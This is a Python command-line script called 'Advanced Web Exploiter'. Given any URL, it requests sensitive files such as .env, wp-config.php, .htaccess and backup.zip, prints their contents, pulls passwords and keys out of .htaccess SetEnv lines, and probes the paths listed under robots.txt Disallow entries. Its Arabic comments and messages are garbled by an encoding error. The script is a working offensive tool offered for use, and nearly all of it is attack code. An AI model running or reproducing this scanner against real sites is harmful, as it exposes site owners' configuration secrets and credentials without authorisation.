#!/usr/bin/env python3
import requests
import re
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

class AdvancedExploiter:
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.found_paths = []
    
    def check_file(self, file_path):
        """ÙØ­Øµ Ù…Ù„Ù Ø­Ø³Ø§Ø³"""
        url = self.target.rstrip('/') + file_path
        try:
            response = self.session.get(url, timeout=10, verify=False)
            if response.status_code == 200:
                return response.text
        except:
            pass
        return None
    
    def extract_paths_from_robots(self, content):
        """Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù…Ø³Ø§Ø±Ø§Øª Ù…Ù† robots.txt"""
        paths = re.findall(r'Disallow:\s*(/.+)', content)
        return paths
    
    def analyze_htaccess(self, content):
        """ØªØ­Ù„ÙŠÙ„ Ù…Ø­ØªÙˆÙ‰ .htaccess"""
        sensitive_info = []
        
        # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† ÙƒÙ„Ù…Ø§Øª Ù…Ø±ÙˆØ±
        passwords = re.findall(r'SetEnv\s+(\w+)\s+"([^"]+)"', content)
        for key, value in passwords:
            if 'pass' in key.lower() or 'key' in key.lower():
                sensitive_info.append(f"{key}: {value}")
        
        # Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ù‚ÙˆØ§Ø¹Ø¯ Ø¥Ø¹Ø§Ø¯Ø© ØªÙˆØ¬ÙŠÙ‡
        rewrites = re.findall(r'RewriteRule\s+([^\s]+)\s+([^\s]+)', content)
        
        return sensitive_info, rewrites
    
    def exploit(self):
        """Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„Ø´Ø§Ù…Ù„"""
        print(f"{Fore.CYAN}ğŸ¯ Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø³ØªØºÙ„Ø§Ù„ Ø§Ù„Ù…ØªÙ‚Ø¯Ù… Ù„: {self.target}{Style.RESET_ALL}")
        
        # ÙØ­Øµ Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„Ø­Ø³Ø§Ø³Ø©
        files_to_check = [
            '/.htaccess', '/robots.txt', '/.env', '/config.php',
            '/wp-config.php', '/backup.zip', '/admin.php'
        ]
        
        for file in files_to_check:
            content = self.check_file(file)
            if content:
                print(f"\n{Fore.GREEN}âœ… ÙˆØ¬Ø¯: {file}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}Ø§Ù„Ù…Ø­ØªÙˆÙ‰:{Style.RESET_ALL}")
                print(content[:1000])  # Ø¹Ø±Ø¶ Ø£ÙˆÙ„ 1000 Ø­Ø±Ù
                
                # ØªØ­Ù„ÙŠÙ„ Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ù…Ù„Ù
                if file == '/.htaccess':
                    passwords, rewrites = self.analyze_htaccess(content)
                    if passwords:
                        print(f"{Fore.RED}ğŸ”‘ ÙƒÙ„Ù…Ø§Øª Ù…Ø±ÙˆØ± Ù…ÙƒØ´ÙˆÙØ©:{Style.RESET_ALL}")
                        for pwd in passwords:
                            print(f"   {pwd}")
                    if rewrites:
                        print(f"{Fore.BLUE}ğŸ”„ Ù‚ÙˆØ§Ø¹Ø¯ Ø¥Ø¹Ø§Ø¯Ø© ØªÙˆØ¬ÙŠÙ‡:{Style.RESET_ALL}")
                        for rule in rewrites:
                            print(f"   {rule[0]} -> {rule[1]}")
                
                elif file == '/robots.txt':
                    paths = self.extract_paths_from_robots(content)
                    if paths:
                        print(f"{Fore.RED}ğŸš« Ù…Ø³Ø§Ø±Ø§Øª Ù…Ø­Ø¸ÙˆØ±Ø©:{Style.RESET_ALL}")
                        for path in paths:
                            full_path = self.target.rstrip('/') + path
                            print(f"   {full_path}")
                            
                            # ÙØ­Øµ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ù…Ø³Ø§Ø± accessible
                            path_content = self.check_file(path)
                            if path_content:
                                print(f"   {Fore.GREEN}ğŸ¯ Ø§Ù„Ù…Ø³Ø§Ø± Ù…ÙØªÙˆØ­!{Style.RESET_ALL}")
                            else:
                                print(f"   {Fore.RED}âŒ Ø§Ù„Ù…Ø³Ø§Ø± Ù…ØºÙ„Ù‚{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Advanced Web Exploiter')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    args = parser.parse_args()
    
    target = args.url if args.url.startswith('http') else 'http://' + args.url
    
    exploiter = AdvancedExploiter(target)
    exploiter.exploit()

if __name__ == "__main__":
    main()